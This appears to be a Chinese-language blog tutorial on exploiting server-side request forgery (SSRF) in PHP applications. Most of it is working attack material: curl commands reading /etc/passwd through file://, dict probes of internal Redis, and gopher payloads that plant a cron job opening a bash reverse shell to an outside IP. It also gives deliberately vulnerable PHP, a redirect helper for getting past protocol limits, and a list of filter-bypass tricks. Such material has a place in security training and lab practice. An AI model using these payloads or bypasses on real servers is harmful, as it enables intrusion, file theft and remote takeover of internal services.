SSRF(Server-side Request Forge, 服务端请求伪造)。
由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。

```bash
curl支持的协议:
┌──(kali㉿kali)-[~]
└─$ curl --version                                                                                                                                                                                                                       2 ⨯
curl 7.74.0 (x86_64-pc-linux-gnu) libcurl/7.74.0 OpenSSL/1.1.1k zlib/1.2.11 brotli/1.0.9 libidn2/2.3.0 libpsl/0.21.0 (+libidn2/2.3.0) libssh2/1.9.0 nghttp2/1.43.0 librtmp/2.3
Release-Date: 2020-12-09
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp 
Features: alt-svc AsynchDNS brotli GSS-API HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets

```

可以看到支持的协议很多。

首先是本地的一些利用：

**DICT**

`.php?url=dict://xxxxxx.com:22`

除了泄露安装软件版本信息，还可以查看端口，操作内网redis服务等

**FILE**

`.php?url=file:///etc/passwd`等

**Gopher**
万能协议（利用Gopher攻击Redis、攻击Fastcgi 等

**FTP(S)/SMB(S)**
匿名访问及爆破

**Tftp**
UDP协议 发送UDP数据包

**Telnet**
SSH/Telnet匿名访问及爆破

```
# dict protocol (操作Redis)
curl -vvv 'dict://127.0.0.1:6379/info'

# file protocol (任意文件读取)
curl -vvv 'file:///etc/passwd'

# gopher protocol (一键反弹Bash)
# * 注意: 链接使用单引号，避免$变量问题
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'

```











远程利用：

漏洞代码ssrf1.php(没有任何ssrf防御)

```php
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);
```

```
# 利用file协议任意文件读取
curl -v 'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'

# 利用dict协议查看端口
curl -v 'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'

# 利用gopher协议反弹shell
curl -v 'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'

```

漏洞代码ssrf2.php

-   限制协议为HTTP、HTTPS
-   设置跳转重定向为True（默认不跳转）

```php
<?php
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
    // 限制为HTTPS、HTTP协议
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);
?>
```

远程利用方式

当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL

那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。

我们继续构造一个302跳转服务，代码如下302.php:

```php
<?php  
$schema = $_GET['s'];
$ip     = $_GET['i'];
$port   = $_GET['p'];
$query  = $_GET['q'];
if(empty($port)){  
    header("Location: $schema://$ip/$query"); 
} else {
    header("Location: $schema://$ip:$port/$query"); 
}
```



利用测试

```
# dict protocol - 探测Redis
dict://127.0.0.1:6379/info  
curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&i=127.0.0.1&port=6379&query=info'

# file protocol - 任意文件读取
curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&query=/etc/passwd'

# gopher protocol - 一键反弹Bash
# * 注意: gopher跳转的时候转义和`url`入参的方式有些区别
curl -vvv 'http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&i=127.0.0.1&p=6389&query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  
a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/103.21.140.84/6789%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  
%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3
%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```

绕过姿势

```

1）http://www.baidu.com@10.10.10.10与http://10.10.10.10请求是相同的

此脚本访问请求得到的内容都是10.10.10.10的内容。

该绕过同样在URL跳转绕过中适用。

http://www.wooyun.org/bugs/wooyun-2015-091690

2）ip地址转换成进制来访问

115.239.210.26 ＝ 16373751032

3）添加端口可能绕过匹配正则

10.10.10.10:80 案例：

http://www.wooyun.org/bugs/wooyun-2014-061850

4）用短地址（302跳转）绕过，案例：

http://www.wooyun.org/bugs/wooyun-2010-0132243

http://www.wooyun.org/bugs/wooyun-2010-0135257

5）利用xip.io和xip.name
10.0.0.1.xip.io 10.0.0.1
www.10.0.0.1.xip.io 10.0.0.1
mysite.10.0.0.1.xip.io 10.0.0.1
foo.bar.10.0.0.1.xip.io 10.0.0.1
10.0.0.1.xip.name  resolves to  10.0.0.1
www.10.0.0.2.xip.name  resolves to  10.0.0.2
foo.10.0.0.3.xip.name  resolves to  10.0.0.3
bar.baz.10.0.0.4.xip.name  resolves to  10.0.0.4
6）利用Enclosed alphanumerics
利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
\7) 利用句号
127。0。0。1  >>>  127.0.0.1

```





https://blog.ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2

-----------------------------------------



ssrf这块国光师傅的博客讲的很好，还有靶场的源码：

博客地址：https://www.sqlsec.com/2021/05/ssrf.html

github地址：https://github.com/sqlsec/ssrf-vuls

